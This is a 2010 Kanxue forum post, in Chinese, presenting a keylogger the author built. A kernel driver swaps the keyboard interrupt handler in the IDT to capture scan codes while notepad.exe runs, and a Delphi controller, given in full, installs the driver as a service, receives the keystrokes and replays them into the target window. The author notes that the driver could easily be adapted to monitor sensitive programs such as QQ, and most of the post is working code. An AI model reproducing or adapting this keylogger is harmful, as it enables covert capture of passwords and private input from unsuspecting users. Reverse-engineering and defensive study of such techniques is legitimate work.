
# [原创]对直接访问键盘控制芯片来获取键盘记录的初步研究

前言：此类文章前辈写了很多，通过自己的编程调试，还是发现了一些问题。通过自己写的一个小程序，来谈谈自己的一点初步研究，希望不会误导大家。

## 一、程序功能

对特定程序进行键盘记录。

## 二、实现原理

应用层将要hook的函数信息传递给驱动，驱动完成系统服务函数地址的替换。该替换后的函数用来监控指定程序的运行，本例当`notepad.exe`运行时就替换键盘的中断服务函数，由新的服务函数来获取键盘的扫描码并传递给ring3层的应用；ring3层的应用中由一个线程函数来获得驱动传递过来的字符并显示到被监控程序的当前输入焦点窗口。

## 三、实现代码

驱动代码的编写参考前辈的和底层键盘hook的相关文章。在调试过程中进行了一些修改，如有雷同，不要奇怪。Ring3层应用逆向了《驱动监控进程的创建》一文的附带例子`protector.exe`，并用Delphi进行了改写，加上了字符的回显功能。驱动源码由于简单的修改即可编译通过，并可以用来监控敏感的软件，如qq 、winrar等，所以还是只给sys文件，供感兴趣的朋友研究使用。在xp sp3上调试通过，这只是单核版，多核上运行不够稳定，功能受到影响。

## 四、问题

### 1、双核或多核电脑上字符记录不全。

调试研究认为可能是一个单线程的负载会在多核心cpu上交叉处理，更底层的原因可能是键盘中断信号在processors上的分配问题。我的程序只是修该了启动processor上的IDT，其他的processors上的IDT服务入口地址并没有修改，用`windbg`调试可以验证。可以参考《软件调试》p274页相关论述。如果手工修改其他processors上的IDT，效果不稳定，易导致系统崩溃。如果设置I/O APIC来指定中断发送到某个processor，同时ring3层应用绑定该processor可以解决字符记录不全的问题，但同样会影响系统的稳定性。我的认识比较肤浅，期待高人解决多核下的问题。

### 2、字符回显的问题。

由于在对`0x60`端口读后，会改变`0x64`端口对应控制寄存器的状态，导致即使跳回原中断服务函数仍然无法实现回显。

```
mov al,0xd2
out 0x64,al
mov al,scancode
out 0x60,al
```

加上以上这段代码在虚拟机里可以实现回显，但真实环境调试后发现无法实现。无奈之下，使用了ring3下模拟发送按键信息来实现。

## 五、补充

不含恶意代码，仅用于研究。由于水平一般，bug难免，如遇bsod，实属正常，多多包涵。

![](https://bbs.kanxue.com/upload/attach/201001/236638_jrg5mkjlbv9d9dw.jpg)

```
unit Unit1;

interface

uses

  Windows, Messages, Classes, Graphics,SysUtils,  Controls, Forms,Dialogs,WinSvc,

  StdCtrls;

type

  TForm1 = class(TForm)

    Button3: TButton;

    Memo1: TMemo;

    Label1: TLabel;

    procedure Button3Click(Sender: TObject);

    procedure FormCreate(Sender: TObject);

    procedure FormClose(Sender: TObject; var Action: TCloseAction);

    private

    public

  end;

var

  Form1: TForm1;

  bnotRun:boolean;

  output : Array[0..255] of char;

  hThreadHandle: Dword;

  dwThreadID: Dword;

  content,targetWnd:HWnd;

implementation

{$R \*.dfm}

const

  lpName ='protectorservice' ;

function GetSysFocus : HWnd;

Var

  hFgWin,FgThreadID: integer;

Begin

  hFgWin := GetForegroundWindow;

  FgThreadID := GetWindowThreadProcessID(hFgWin, nil);

  If AttachThreadInput(GetCurrentThreadID, FgThreadID, true) Then

    Begin

        result := GetFocus;

        AttachThreadInput(GetCurrentThreadID, FgThreadID, False);

    End

      else

        result := 0;

End;

procedure  MyThreadFunc(Sender: TObject);

var  s,ss:string;

     flag:boolean;

     pp:pchar;

     previous:integer;

     focused:HWnd;

     ch:char;

     mykey:word;

begin

     flag:=true;

     previous:=0;

     pp:=@output[8];

     ss:='';

     while flag do

      begin

          sleep(100);

          targetWnd := FindWindow('Notepad',nil);

          while targetWnd=0 do

             begin

                sleep(1000);

                targetWnd := FindWindow('Notepad',nil);

                content:= FindWindowEx(targetWnd,0,'Edit', '');

                if ((content>0) and (targetWnd>0)) then

                   begin

                       form1.Button3.enabled:=true;

                       break;

                   end else targetWnd:=0;

             end;

           s:=StrPas(pp);

           if s='' then continue;

           if  (length(s)>previous) then

             begin

               if (s<>'') then

                  begin

                      ch:=output[length(s)+7];

                      mykey:=Ord(ch);

                      focused:=GetSysFocus;

                      if  focused=content  then

                         begin

                             Case mykey of

                              $08..$09,$0d:PostMessage(content, WM\_KEYDOWN,mykey, 0);

                              else

                                PostMessage(content, WM\_CHAR, mykey, 0);

                              end ;

                          end;

                      if ((mykey>=$20) and (mykey<=$7e)) then  ss:=ss+ch;

                      if mykey=$08 then ss:=copy(ss,1,length(ss)-1);

                      form1.Memo1.Text :=ss;

                      previous:= length(s);

                  end;

             end;

           if bnotRun then

            begin

               TerminateThread(hThreadHandle, 0);

               Break;

            end;

      end;

end;

procedure readywork;

var

   hDevice:Thandle;

   cbBytesReturned:DWord;

   Handle: Integer;

   addr,addr1: LPDWORD;

   Buffer : Array[0..255] of Byte;

   tmp:byte;

begin

     FillChar(Buffer,$100,#0);

      hDevice := CreateFile( '\\.\PROTECTOR',GENERIC\_READ or GENERIC\_WRITE, 0, nil,OPEN\_EXISTING,4, 0 );

      Handle := GetModuleHandle('ntdll.dll');

      if Handle <> 0 then  addr:= GetProcAddress(Handle,'NtCreateSection');

       asm

          mov eax,addr

          add eax,1

          mov eax,[eax]

          mov tmp,al

       end;

       buffer[0]:=tmp;

       addr:=@output;

       addr1:=@Buffer;

       inc(addr1);

       addr1^:=Cardinal(addr);

    if not DeviceIoControl(hDevice,$3e8,@Buffer,$100,@Buffer,$100, cbBytesReturned, nil ) then    Exit;

     CloseHandle(hDevice);

     hThreadHandle:=CreateThread(nil,0,@MyThreadfunc,nil,0,dwThreadID);

     if hThreadHandle=0 then   showmessage('Didn’t Create a Thread');

end;

procedure TForm1.Button3Click(Sender: TObject);

var

  SCManager: SC\_Handle;

  Service: SC\_Handle;

  Args: Pchar;

  stStatus: TServiceStatus;

begin

    SCManager := OpenSCManager(nil, nil, $F003F);

    if SCManager = 0 then Exit;

    try

      Service := OpenService(SCManager,lpName,$F01FF);

      if bnotRun then

        begin

          StartService(Service, 0,Args);

          bnotRun:=false;

          Button3.Caption:='结束';

          readywork;

      end else

        begin

          ControlService(Service, SERVICE\_CONTROL\_STOP, stStatus);

          bnotRun:=true;

          Button3.Caption:='开始';

          content:=0;

          targetWnd:=0;

          showmessage('总共记录('+inttostr(length(memo1.Text))+')个字符');

        end;

      CloseServiceHandle(Service);

    finally

      CloseServiceHandle(SCManager);

    end;

end;

procedure TForm1.FormCreate(Sender: TObject);

var

     SCManager: SC\_HANDLE;

     Service: SC\_HANDLE;

     lpSysName: Pchar;

begin

      bnotRun:=true;

      targetWnd :=0;

      content:=0;

      lpSysName:= pchar(GetCurrentDir+'\notepad.sys');

      SCManager := OpenSCManager(nil, nil, $F003F);

      if SCManager = 0 then Exit;

      Service := CreateService(SCManager,lpName,lpName, 30, 1, 3, 1, lpSysName, nil, nil, nil, nil, nil);

      if (Service<>0) then  Button3.Enabled:=true

          else   showmessage('Error,try again');

      CloseServiceHandle (Service);

end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);

var

  SCManager: SC\_HANDLE;

  Service: SC\_HANDLE;

  stStatus: TServiceStatus;

begin

    bnotRun:=true;

    SCManager := OpenSCManager(nil, nil, $F003F);

    if SCManager = 0 then Exit;

    try

      Service := OpenService(SCManager,lpName,$F01FF);

      ControlService(Service,SERVICE\_CONTROL\_STOP, stStatus);

      DeleteService(Service);

      CloseServiceHandle(Service);

    finally

      CloseServiceHandle(SCManager);

    end;

end;

end.
```

By 天易love 2010-1-21

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

[#系统底层](https://bbs.kanxue.com/forum-4-1-2.htm)

上传的附件：

- [键盘记录投稿.rar](javascript:void(0);)

  （169.76kb，233次下载）

- [pic.JPG](javascript:void(0);)

  （24.47kb，797次下载）
